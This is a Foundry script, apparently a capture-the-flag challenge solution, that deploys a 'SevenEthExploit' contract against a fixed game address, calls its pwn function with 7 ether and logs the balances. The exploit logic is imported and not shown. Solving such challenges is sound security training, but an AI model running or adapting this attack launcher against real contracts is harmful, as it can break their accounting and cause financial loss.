// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {SevenEthExploit} from "../src/challenges/Challenge4_ForceSendEth/Challenge4_ForceSendEth.sol";

contract ExecuteChallenge4OnChain is Script {
    function run() external {
        string memory privateKeyStr = vm.envString("PRIVATE_KEY");
        bytes memory keyBytes = bytes(privateKeyStr);
        
        string memory hexKey;
        if (keyBytes.length >= 2 && keyBytes[0] == "0" && keyBytes[1] == "x") {
            hexKey = privateKeyStr;
        } else {
            hexKey = string.concat("0x", privateKeyStr);
        }
        
        bytes32 keyBytes32 = vm.parseBytes32(hexKey);
        uint256 deployerPrivateKey = uint256(keyBytes32);
        vm.startBroadcast(deployerPrivateKey);

        address gameAddress = 0x6C5702d40912726316B503BaBC01F3Ed1d9DcB57;
        
        console.log("Game address:", gameAddress);
        console.log("Game balance before:", address(gameAddress).balance);
        
        SevenEthExploit exploit = new SevenEthExploit(gameAddress);
        console.log("Exploit deployed at:", address(exploit));
        
        exploit.pwn{value: 7 ether}();
        
        console.log("Game balance after:", address(gameAddress).balance);
        
        vm.stopBroadcast();
    }
}

